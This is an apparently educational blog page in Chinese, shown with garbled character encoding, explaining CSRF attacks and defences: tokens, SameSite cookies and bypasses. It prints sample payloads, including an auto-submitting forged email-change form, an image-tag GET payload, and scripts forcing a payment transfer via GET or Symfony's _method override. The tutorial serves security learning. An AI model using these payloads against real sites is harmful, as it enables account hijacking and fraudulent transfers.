<h2 id="CSRFæ˜¯å¦‚ä½•èµ·æ•ˆçš„"><a href="#CSRFæ˜¯å¦‚ä½•èµ·æ•ˆçš„" class="headerlink" title="CSRFæ˜¯å¦‚ä½•èµ·æ•ˆçš„"></a>CSRFæ˜¯å¦‚ä½•èµ·æ•ˆçš„</h2><p>æƒ³è¦è§¦å‘CSRFå°±è¦æ»¡è¶³ä¸‹é¢çš„ä¸‰ä¸ªæ¡ä»¶</p>
<ul>
<li><strong>ç›¸å…³æ“ä½œ</strong>ã€‚åº”ç”¨ç¨‹åºä¸­å­˜åœ¨æ”»å‡»è€…æœ‰ç†ç”±è¯±å‘çš„æ“ä½œã€‚è¿™å¯èƒ½æ˜¯ç‰¹æƒæ“ä½œï¼ˆä¾‹å¦‚ä¿®æ”¹å…¶ä»–ç”¨æˆ·çš„æƒé™ï¼‰æˆ–é’ˆå¯¹ç”¨æˆ·ç‰¹å®šæ•°æ®çš„ä»»ä½•æ“ä½œï¼ˆä¾‹å¦‚æ›´æ”¹ç”¨æˆ·è‡ªå·±çš„å¯†ç ï¼‰ã€‚</li>
<li><strong>åŸºäº Cookie çš„ä¼šè¯å¤„ç†</strong>ã€‚æ‰§è¡Œæ“ä½œæ¶‰åŠå‘å‡ºä¸€ä¸ªæˆ–å¤šä¸ª HTTP è¯·æ±‚ï¼Œåº”ç”¨ç¨‹åºä»…ä¾é ä¼šè¯ cookie æ¥è¯†åˆ«å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ã€‚æ²¡æœ‰å…¶ä»–æœºåˆ¶æ¥è·Ÿè¸ªä¼šè¯æˆ–éªŒè¯ç”¨æˆ·è¯·æ±‚ã€‚</li>
<li><strong>æ²¡æœ‰ä¸å¯é¢„æµ‹çš„è¯·æ±‚å‚æ•°</strong>ã€‚æ‰§è¡Œæ“ä½œçš„è¯·æ±‚ä¸åŒ…å«ä»»ä½•æ”»å‡»è€…æ— æ³•ç¡®å®šæˆ–çŒœæµ‹å…¶å€¼çš„å‚æ•°ã€‚ä¾‹å¦‚ï¼Œå½“å¯¼è‡´ç”¨æˆ·æ›´æ”¹å¯†ç æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦çŸ¥é“ç°æœ‰å¯†ç çš„å€¼ï¼Œåˆ™è¯¥åŠŸèƒ½ä¸ä¼šå—åˆ°æ”»å‡»ã€‚</li>
</ul>
<p>æ¯”å¦‚æŸä¸ªç½‘é¡µæœ‰ä¿®æ”¹é‚®ç®±å¯†ç çš„åŠŸèƒ½ï¼Œå½“ç”¨æˆ·æ‰§è¡Œè¿™ä¸ªæ“ä½œçš„æ—¶å€™ï¼Œä»–ä»¬å°±ä¼šå‘é€ä¸‹é¢çš„è¯·æ±‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/email/change</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">email</span>=wiener@normal-user.com</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™å°±æ»¡è¶³äº†ç›¸å…³æ“ä½œ cookieè®¤è¯ ä»¥åŠå‚æ•°å¯ä»¥é¢„çŸ¥çš„è¦æ±‚ï¼Œæ‰€ä»¥å­˜åœ¨csrfæ¼æ´ã€‚<br>æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªhtmlç½‘é¡µ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://vulnerable-website.com/email/change&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pwned@evil-user.net&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å½“ç”¨æˆ·è®¿é—®è¿™ä¸ªç½‘é¡µçš„æ—¶å€™ï¼Œæ”»å‡»è€…çš„é¡µé¢å°†è§¦å‘å¯¹å­˜åœ¨æ¼æ´çš„ç½‘ç«™çš„ HTTP è¯·æ±‚ã€‚å¦‚æœç”¨æˆ·ç™»å½•ä¹‹åï¼Œä»–ä»¬çš„æµè§ˆå™¨å°†è‡ªåŠ¨åœ¨è¯·æ±‚ä¸­åŒ…å«ä»–ä»¬çš„ä¼šè¯ cookieã€‚<br>å­˜åœ¨æ¼æ´çš„ç½‘ç«™å°†ä»¥æ­£å¸¸æ–¹å¼å¤„ç†è¯¥è¯·æ±‚ï¼Œå°†å…¶è§†ä¸ºå—å®³è€…ç”¨æˆ·å‘å‡ºçš„è¯·æ±‚ï¼Œå¹¶æ›´æ”¹å…¶ç”µå­é‚®ä»¶åœ°å€ã€‚</p>
<h2 id="å¦‚ä½•æ„é€ CSRF"><a href="#å¦‚ä½•æ„é€ CSRF" class="headerlink" title="å¦‚ä½•æ„é€ CSRF"></a>å¦‚ä½•æ„é€ CSRF</h2><p>å¯ä»¥ä½¿ç”¨bpè‡ªå¸¦çš„CSRF pocç”Ÿæˆå™¨<br>æ¯”å¦‚è¿™ä¸ªç½‘é¡µæœ‰ä¸€ä¸ªä¿®æ”¹é‚®ç®±çš„åŠŸèƒ½ï¼Œåœ¨ç™»å½•è‡ªå·±çš„è´¦æˆ·ä¹‹åï¼ŒæŠ“åŒ…<br><img src="https://pic1.imgdb.cn/item/67c45dc0d0e0a243d40a2b00.png"><br>åœ¨è¿™ä¸ªé¡µé¢ç”¨bpè‡ªå¸¦çš„CSRF pocç”Ÿæˆå™¨ï¼Œç„¶åç‚¹å‡»regenerate æŠŠè¿™ä¸ªpocæ”¾åœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šï¼Œ<br>è¿™æ ·å­ç”¨æˆ·åœ¨ç‚¹å‡»è¿™ä¸ªè¯·æ±‚çš„æ—¶å€™ï¼Œæµè§ˆå™¨å°±ä¼šå‘é€è¯·æ±‚ç»™ä¿®æ”¹é‚®ç®±çš„ç•Œé¢ï¼Œå› ä¸ºæµè§ˆå™¨ä¸­å­˜ç€ç”¨æˆ·çš„cookieï¼Œå°±åˆ†ä¸æ¸…æ˜¯ç”¨æˆ·è¿˜æ˜¯æ”»å‡»è€…çš„æ¶æ„è¯·æ±‚</p>
<h2 id="æ€ä¹ˆä¼ æ’­CSRF"><a href="#æ€ä¹ˆä¼ æ’­CSRF" class="headerlink" title="æ€ä¹ˆä¼ æ’­CSRF"></a>æ€ä¹ˆä¼ æ’­CSRF</h2><p>ä¸Šé¢è¯´äº†CSRFæ€ä¹ˆæ„å»ºï¼Œç°åœ¨è¦æ€ä¹ˆè®©ç”¨æˆ·æ¥è§¦å‘è¿™ä¸ªæ¼æ´å‘¢ã€‚é€šå¸¸ï¼Œæ”»å‡»è€…ä¼šå°†æ¶æ„ HTML æ”¾åˆ°ä»–ä»¬æ§åˆ¶çš„ç½‘ç«™ä¸Šï¼Œç„¶åè¯±ä½¿å—å®³è€…è®¿é—®è¯¥ç½‘ç«™ã€‚è¿™å¯èƒ½é€šè¿‡å‘ç”¨æˆ·æä¾›è¯¥ç½‘ç«™çš„é“¾æ¥ï¼ˆé€šè¿‡ç”µå­é‚®ä»¶æˆ–ç¤¾äº¤åª’ä½“æ¶ˆæ¯ï¼‰æ¥å®ç°ã€‚</p>
<p>ä¸€äº›ç®€å•çš„CSRFæ¼æ´åˆ©ç”¨äº†GETæ–¹æ³•ï¼Œå¹¶ä¸”å¯ä»¥å®Œå…¨ç‹¬ç«‹äºæ˜“å—æ”»å‡»çš„ç½‘ç«™ä¸Šçš„å•ä¸ª URLã€‚æ”»å‡»è€…å¯ä»¥ç›´æ¥å‘å—å®³è€…æä¾›æ˜“å—æ”»å‡»çš„åŸŸä¸Šçš„æ¶æ„ URLã€‚åœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œå¦‚æœå¯ä»¥ä½¿ç”¨ GET æ–¹æ³•æ‰§è¡Œæ›´æ”¹ç”µå­é‚®ä»¶åœ°å€çš„è¯·æ±‚ï¼Œé‚£ä¹ˆè‡ªåŒ…å«æ”»å‡»å°†å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;https://vulnerable-website.com/email/change?email=pwned@evil-user.net&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="CSRFå¸¸è§çš„é˜²æŠ¤æªæ–½"><a href="#CSRFå¸¸è§çš„é˜²æŠ¤æªæ–½" class="headerlink" title="CSRFå¸¸è§çš„é˜²æŠ¤æªæ–½"></a>CSRFå¸¸è§çš„é˜²æŠ¤æªæ–½</h2><h3 id="CSRF-tokens"><a href="#CSRF-tokens" class="headerlink" title="CSRF-tokens"></a>CSRF-tokens</h3><p>ç”±æœåŠ¡å™¨ç«¯åº”ç”¨ç¨‹åºç”Ÿæˆå¹¶ä¸å®¢æˆ·ç«¯å…±äº«çš„å”¯ä¸€ã€ç§˜å¯†ä¸”ä¸å¯é¢„æµ‹çš„å€¼ã€‚å½“å°è¯•æ‰§è¡Œæ•æ„Ÿæ“ä½œï¼ˆä¾‹å¦‚æäº¤è¡¨å•ï¼‰æ—¶ï¼Œå®¢æˆ·ç«¯å¿…é¡»åœ¨è¯·æ±‚ä¸­åŒ…å«æ­£ç¡®çš„CSRF-tokens.è¿™ä½¿å¾—æ”»å‡»è€…å¾ˆéš¾ä»£è¡¨å—å®³è€…æ„å»ºæœ‰æ•ˆçš„è¯·æ±‚ã€‚</p>
<p>ä¸å®¢æˆ·ç«¯å…±äº« CSRF tokensçš„å¸¸è§æ–¹æ³•æ˜¯å°†å®ƒä»¬ä½œä¸ºéšè—å‚æ•°åŒ…å«åœ¨ HTML è¡¨å•ä¸­ï¼Œä¾‹å¦‚ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">&lt;form <span class="type">name</span>=&quot;change-email-form&quot; action=&quot;/my-account/change-email&quot; <span class="keyword">method</span>=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;label&gt;Email&lt;/label&gt;</span><br><span class="line">    &lt;<span class="keyword">input</span> required <span class="keyword">type</span>=&quot;email&quot; <span class="type">name</span>=&quot;email&quot; <span class="keyword">value</span>=&quot;example@normal-website.com&quot;&gt;</span><br><span class="line">    &lt;<span class="keyword">input</span> required <span class="keyword">type</span>=&quot;hidden&quot; <span class="type">name</span>=&quot;csrf&quot; <span class="keyword">value</span>=&quot;50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&quot;&gt;</span><br><span class="line">    &lt;button <span class="keyword">class</span>=<span class="string">&#x27;button&#x27;</span> <span class="keyword">type</span>=<span class="string">&#x27;submit&#x27;</span>&gt; <span class="keyword">Update</span> email &lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></div>

<p>å¸¸è§ç¼ºé™·ï¼š</p>
<ul>
<li>1ã€å½“è¯·æ±‚ä½¿ç”¨ POST æ–¹æ³•æ—¶ï¼ŒæŸäº›åº”ç”¨ç¨‹åºä¼šæ­£ç¡®éªŒè¯tokensï¼Œä½†ä½¿ç”¨ GET æ–¹æ³•æ—¶åˆ™ä¼šè·³è¿‡éªŒè¯ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥åˆ‡æ¢åˆ° GET æ–¹æ³•æ¥ç»•è¿‡éªŒè¯å¹¶å‘èµ· CSRF æ”»å‡»ï¼š</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/email/change?email=pwned@evil-user.net</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm</span><br></pre></td></tr></table></figure></div>
<p>åœ¨bpè¯·æ±‚ä¸­å³é”®åˆ‡æ¢è¯·æ±‚æ–¹å¼å°±å¯ä»¥äº†</p>
<ul>
<li><p>2ã€å½“tokenså­˜åœ¨æ—¶ï¼ŒæŸäº›åº”ç”¨ç¨‹åºä¼šæ­£ç¡®éªŒè¯tokensï¼Œä½†å¦‚æœçœç•¥tokensï¼Œåˆ™ä¼šè·³è¿‡éªŒè¯ã€‚</p>
</li>
<li><p>3ã€ä¸€äº›åº”ç”¨ç¨‹åºç¡®å®å°† CSRF  tokensç»‘å®šåˆ° Cookieï¼Œä½†ä¸ä¼šç»‘å®šåˆ°ç”¨äºè·Ÿè¸ªä¼šè¯çš„åŒä¸€ Cookie<br>æ¯”å¦‚æˆ‘æœ‰ä¸¤ä¸ªç”¨æˆ·ï¼Œæˆ‘åœ¨aç”¨æˆ·çš„cookieå’Œcsrfåœ¨bç”¨æˆ·ä¸Šä¹Ÿèƒ½ç”¨</p>
</li>
</ul>
<p>Cookie è®¾ç½®è¡Œä¸ºç”šè‡³ä¸éœ€è¦å­˜åœ¨äºä¸ CSRF æ¼æ´ç›¸åŒçš„ Web åº”ç”¨ç¨‹åºä¸­ã€‚å¦‚æœå—æ§ Cookie å…·æœ‰åˆé€‚çš„èŒƒå›´ï¼Œåˆ™åŒä¸€æ•´ä½“ DNS åŸŸä¸­çš„ä»»ä½•å…¶ä»–åº”ç”¨ç¨‹åºéƒ½å¯èƒ½è¢«åˆ©ç”¨æ¥åœ¨ç›®æ ‡åº”ç”¨ç¨‹åºä¸­è®¾ç½® Cookieã€‚ä¾‹å¦‚ï¼Œå¯ä»¥åˆ©ç”¨ staging.demo.normal-website.com ä¸Šçš„ Cookie è®¾ç½®å‡½æ•°æ¥æ”¾ç½®æäº¤ç»™ secure.normal-website.com Cookieã€‚</p>
<ul>
<li>4ã€ CSRF token åªæ˜¯åœ¨ cookie ä¸­å¤åˆ¶<br>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœç½‘ç«™åŒ…å«ä»»ä½• cookie è®¾ç½®åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯ä»¥å†æ¬¡æ‰§è¡Œ CSRF æ”»å‡»ã€‚æ­¤æ—¶ï¼Œæ”»å‡»è€…æ— éœ€è·å–è‡ªå·±çš„æœ‰æ•ˆ tokensã€‚ä»–ä»¬åªéœ€å‘æ˜ä¸€ä¸ª tokensï¼ˆå¦‚æœç»è¿‡æ£€æŸ¥ï¼Œå¯èƒ½æ˜¯æ‰€éœ€çš„æ ¼å¼ï¼‰ï¼Œåˆ©ç”¨ cookie è®¾ç½®è¡Œä¸ºå°†å…¶ cookie æ”¾å…¥å—å®³è€…çš„æµè§ˆå™¨ä¸­ï¼Œç„¶ååœ¨ CSRF æ”»å‡»ä¸­å°†å…¶ tokensæä¾›ç»™å—å®³è€…ã€‚</li>
</ul>
<h3 id="SameSite-Cookie"><a href="#SameSite-Cookie" class="headerlink" title="SameSite Cookie"></a>SameSite Cookie</h3><p>SameSite æ˜¯ä¸€ç§æµè§ˆå™¨å®‰å…¨æœºåˆ¶ï¼Œç”¨äºç¡®å®šä½•æ—¶å°†ç½‘ç«™çš„ Cookie åŒ…å«åœ¨æ¥è‡ªå…¶ä»–ç½‘ç«™çš„è¯·æ±‚ä¸­ã€‚ç”±äºæ‰§è¡Œæ•æ„Ÿæ“ä½œçš„è¯·æ±‚é€šå¸¸éœ€è¦ç»è¿‡èº«ä»½éªŒè¯çš„ä¼šè¯ Cookieï¼Œå› æ­¤é€‚å½“çš„ SameSite é™åˆ¶å¯èƒ½ä¼šé˜»æ­¢æ”»å‡»è€…è·¨ç«™ç‚¹è§¦å‘è¿™äº›æ“ä½œã€‚</p>
<p>åœ¨ SameSite Cookie ç¯å¢ƒä¸­ï¼Œç«™ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>åœ¨ SameSite Cookie é™åˆ¶çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œç«™ç‚¹è¢«å®šä¹‰ä¸ºé¡¶çº§åŸŸå (TLD)ï¼Œé€šå¸¸ä¸º.com æˆ–.net ï¼ŒåŠ ä¸ŠåŸŸåçš„é™„åŠ ä¸€çº§ã€‚è¿™é€šå¸¸ç§°ä¸º TLD+1ã€‚<br><img src="https://pic1.imgdb.cn/item/67c47c75d0e0a243d40a34fa.png"><br>åœ¨ç¡®å®šè¯·æ±‚æ˜¯å¦ä¸ºåŒç«™è¯·æ±‚æ—¶ï¼Œè¿˜ä¼šè€ƒè™‘ URL æ–¹æ¡ˆã€‚è¿™æ„å‘³ç€ä» <a href="http://app.example.com/">http://app.example.com</a> åˆ° <a href="https://app.example.com/">https://app.example.com</a> çš„é“¾æ¥è¢«å¤§å¤šæ•°æµè§ˆå™¨è§†ä¸ºè·¨ç«™è¯·æ±‚ã€‚</p>
<p>å¦å¤–ç”¨ä¸¤å¹…å›¾æ¥åŒºåˆ†siteå’Œoringin<br><img src="https://pic1.imgdb.cn/item/67c47d5bd0e0a243d40a352c.png"><br><img src="https://pic1.imgdb.cn/item/67c47d66d0e0a243d40a3532.png">\</p>
<p>Samesiteçš„å·¥ä½œæ–¹å¼<br>åœ¨å¼•å…¥ SameSite æœºåˆ¶ä¹‹å‰ï¼Œæµè§ˆå™¨ä¼šåœ¨æ¯ä¸ªè¯·æ±‚ä¸­å‘å‘å‡ºè¯·æ±‚çš„åŸŸå‘é€ Cookieï¼Œå³ä½¿è¯·æ±‚æ˜¯ç”±ä¸ç›¸å…³çš„ç¬¬ä¸‰æ–¹ç½‘ç«™è§¦å‘çš„ã€‚SameSite çš„å·¥ä½œåŸç†æ˜¯è®©æµè§ˆå™¨å’Œç½‘ç«™æ‰€æœ‰è€…é™åˆ¶å“ªäº›è·¨ç«™ç‚¹è¯·æ±‚ï¼ˆå¦‚æœæœ‰ï¼‰åº”åŒ…å«ç‰¹å®š Cookieã€‚è¿™æœ‰åŠ©äºå‡å°‘ç”¨æˆ·å—åˆ° CSRF æ”»å‡»çš„é£é™©ï¼Œè¿™ç§æ”»å‡»ä¼šè¯±ä½¿å—å®³è€…çš„æµè§ˆå™¨å‘å‡ºè§¦å‘æ˜“å—æ”»å‡»çš„ç½‘ç«™çš„æœ‰å®³æ“ä½œçš„è¯·æ±‚ã€‚ç”±äºè¿™äº›è¯·æ±‚é€šå¸¸éœ€è¦ä¸å—å®³è€…çš„ç»è¿‡èº«ä»½éªŒè¯çš„ä¼šè¯ç›¸å…³è”çš„ Cookieï¼Œå› æ­¤å¦‚æœæµè§ˆå™¨ä¸åŒ…å«æ­¤ Cookieï¼Œæ”»å‡»å°±ä¼šå¤±è´¥ã€‚<br>æ‰€æœ‰ä¸»æµæµè§ˆå™¨ç›®å‰éƒ½æ”¯æŒä»¥ä¸‹ SameSite é™åˆ¶çº§åˆ«ï¼š</p>
<p>Strict<br>Lax<br>None</p>
<p>å¼€å‘äººå‘˜å¯ä»¥æ‰‹åŠ¨é…ç½®ä»–ä»¬è®¾ç½®çš„æ¯ä¸ª Cookie çš„é™åˆ¶çº§åˆ«ï¼Œä»è€Œæ›´å¥½åœ°æ§åˆ¶ä½•æ—¶ä½¿ç”¨è¿™äº› Cookieã€‚ä¸ºæ­¤ï¼Œä»–ä»¬åªéœ€åœ¨ Set-Cookie å“åº”æ ‡å¤´ä¸­åŒ…å« SameSite å±æ€§åŠå…¶é¦–é€‰å€¼ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">Set-Cookie: <span class="attribute">session</span>=0F8tgdOhi9ynR1M9wa3ODa; <span class="attribute">SameSite</span>=Strict</span><br></pre></td></tr></table></figure></div>
<p>å¦‚æœå‘å¸ƒ Cookie çš„ç½‘ç«™æœªæ˜ç¡®è®¾ç½® SameSite å±æ€§ï¼ŒChrome ä¼šé»˜è®¤è‡ªåŠ¨åº”ç”¨ Lax é™åˆ¶ã€‚è¿™æ„å‘³ç€ Cookie ä»…åœ¨ç¬¦åˆç‰¹å®šæ¡ä»¶çš„è·¨ç«™ç‚¹è¯·æ±‚ä¸­å‘é€ï¼Œå³ä½¿å¼€å‘äººå‘˜ä»æœªé…ç½®æ­¤è¡Œä¸ºã€‚</p>
<p>Strict:<br>å¦‚æœ Cookie è®¾ç½®äº† SameSite&#x3D;Strict å±æ€§ï¼Œæµè§ˆå™¨å°†ä¸ä¼šåœ¨ä»»ä½•è·¨ç«™ç‚¹è¯·æ±‚ä¸­å‘é€è¯¥ Cookieã€‚ç®€å•æ¥è¯´ï¼Œè¿™æ„å‘³ç€å¦‚æœè¯·æ±‚çš„ç›®æ ‡ç«™ç‚¹ä¸æµè§ˆå™¨åœ°å€æ ä¸­å½“å‰æ˜¾ç¤ºçš„ç«™ç‚¹ä¸åŒ¹é…ï¼Œåˆ™ä¸ä¼šåŒ…å«è¯¥ Cookieã€‚<br>è™½ç„¶è¿™æ˜¯æœ€å®‰å…¨çš„é€‰æ‹©ï¼Œä½†åœ¨éœ€è¦è·¨ç«™ç‚¹åŠŸèƒ½çš„æƒ…å†µä¸‹ï¼Œå®ƒå¯èƒ½ä¼šå¯¹ç”¨æˆ·ä½“éªŒäº§ç”Ÿè´Ÿé¢å½±å“ã€‚</p>
<p>Lac:<br>Lax SameSite é™åˆ¶æ„å‘³ç€æµè§ˆå™¨å°†åœ¨è·¨ç«™ç‚¹è¯·æ±‚ä¸­å‘é€ cookieï¼Œä½†å‰ææ˜¯æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š</p>
<ul>
<li>è¯·æ±‚ä½¿ç”¨ GET æ–¹æ³•ã€‚</li>
<li>è¯¥è¯·æ±‚æºè‡ªç”¨æˆ·çš„é¡¶çº§å¯¼èˆªï¼Œä¾‹å¦‚å•å‡»é“¾æ¥ã€‚</li>
</ul>
<p>è¿™æ„å‘³ç€ cookie ä¸åŒ…å«åœ¨è·¨ç«™ç‚¹ POST è¯·æ±‚ä¸­ã€‚ç”±äº POST è¯·æ±‚é€šå¸¸ç”¨äºæ‰§è¡Œä¿®æ”¹æ•°æ®æˆ–çŠ¶æ€çš„æ“ä½œï¼ˆè‡³å°‘æ ¹æ®æœ€ä½³å®è·µï¼‰ï¼Œå› æ­¤å®ƒä»¬æ›´æœ‰å¯èƒ½æˆä¸º CSRF æ”»å‡»çš„ç›®æ ‡ã€‚</p>
<p>å½“ä½¿ç”¨ SameSite&#x3D;None è®¾ç½® cookie æ—¶ï¼Œç½‘ç«™è¿˜å¿…é¡»åŒ…å« Secure å±æ€§ï¼Œä»¥ç¡®ä¿ cookie ä»…é€šè¿‡ HTTPS ä»¥åŠ å¯†æ¶ˆæ¯å½¢å¼å‘é€ã€‚å¦åˆ™ï¼Œæµè§ˆå™¨å°†æ‹’ç»è¯¥ cookie å¹¶ä¸”ä¸ä¼šè®¾ç½®ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">Set-Cookie: <span class="attribute">trackingId</span>=0F8tgdOhi9ynR1M9wa3ODa; <span class="attribute">SameSite</span>=None; Secure</span><br></pre></td></tr></table></figure></div>

<h4 id="ä½¿ç”¨-GET-è¯·æ±‚ç»•è¿‡-SameSite-Lax-é™åˆ¶"><a href="#ä½¿ç”¨-GET-è¯·æ±‚ç»•è¿‡-SameSite-Lax-é™åˆ¶" class="headerlink" title="ä½¿ç”¨ GET è¯·æ±‚ç»•è¿‡ SameSite Lax é™åˆ¶"></a>ä½¿ç”¨ GET è¯·æ±‚ç»•è¿‡ SameSite Lax é™åˆ¶</h4><p>å®é™…ä¸Šï¼ŒæœåŠ¡å™¨å¹¶ä¸æ€»æ˜¯å¯¹å®ƒä»¬æ˜¯å¦æ¥æ”¶å¯¹ç»™å®šç«¯ç‚¹çš„ GET æˆ– POST è¯·æ±‚å¾ˆæŒ‘å‰”ï¼Œå³ä½¿æ˜¯é‚£äº›æœŸæœ›è¡¨å•æäº¤çš„æœåŠ¡å™¨ã€‚å¦‚æœä»–ä»¬ä¹Ÿå¯¹å…¶ä¼šè¯ cookie ä½¿ç”¨ Lax é™åˆ¶ï¼ˆæ— è®ºæ˜¯æ˜ç¡®è¿˜æ˜¯ç”±äºæµè§ˆå™¨é»˜è®¤ï¼‰ï¼Œ ä»ç„¶å¯ä»¥é€šè¿‡ä»å—å®³è€…çš„æµè§ˆå™¨å¼•å‡º GET è¯·æ±‚æ¥æ‰§è¡Œ CSRF æ”»å‡»ã€‚<br>åªè¦è¯·æ±‚æ¶‰åŠé¡¶çº§å¯¼èˆªï¼Œæµè§ˆå™¨ä»å°†åŒ…å«å—å®³è€…çš„ä¼šè¯ cookieã€‚ä»¥ä¸‹æ˜¯å‘èµ·æ­¤ç±»æ”»å‡»çš„æœ€ç®€å•æ–¹æ³•ä¹‹ä¸€ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amp;amount=1000000&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å³ä½¿ä¸å…è®¸æ™®é€šçš„ GET è¯·æ±‚ï¼ŒæŸäº›æ¡†æ¶ä¹Ÿæä¾›äº†è¦†ç›–è¯·æ±‚è¡Œä¸­æŒ‡å®šçš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼ŒSymfony åœ¨è¡¨å•ä¸­æ”¯æŒ_method å‚æ•°ï¼Œè¯¥å‚æ•°åœ¨è·¯ç”±æ–¹é¢ä¼˜å…ˆäºæ™®é€šæ–¹æ³•ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">&lt;form action<span class="operator">=</span><span class="string">&quot;https://vulnerable-website.com/account/transfer-payment&quot;</span> method<span class="operator">=</span><span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;input type<span class="operator">=</span><span class="string">&quot;hidden&quot;</span> name<span class="operator">=</span><span class="string">&quot;_method&quot;</span> value<span class="operator">=</span><span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">    &lt;input type<span class="operator">=</span><span class="string">&quot;hidden&quot;</span> name<span class="operator">=</span><span class="string">&quot;recipient&quot;</span> value<span class="operator">=</span><span class="string">&quot;hacker&quot;</span>&gt;</span><br><span class="line">    &lt;input type<span class="operator">=</span><span class="string">&quot;hidden&quot;</span> name<span class="operator">=</span><span class="string">&quot;amount&quot;</span> value<span class="operator">=</span><span class="string">&quot;1000000&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></div>

<p>æ¯”å¦‚ç°åœ¨gooleä½¿ç”¨çš„POSTè¯·æ±‚ä¼šåœ¨ä¸¤åˆ†é’Ÿå†…æ‰èƒ½æˆåŠŸéªŒè¯cookieï¼Œæˆ‘ä»¬æƒ³ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œå°±å¯ä»¥ä½¿ç”¨<code>_method</code></p>
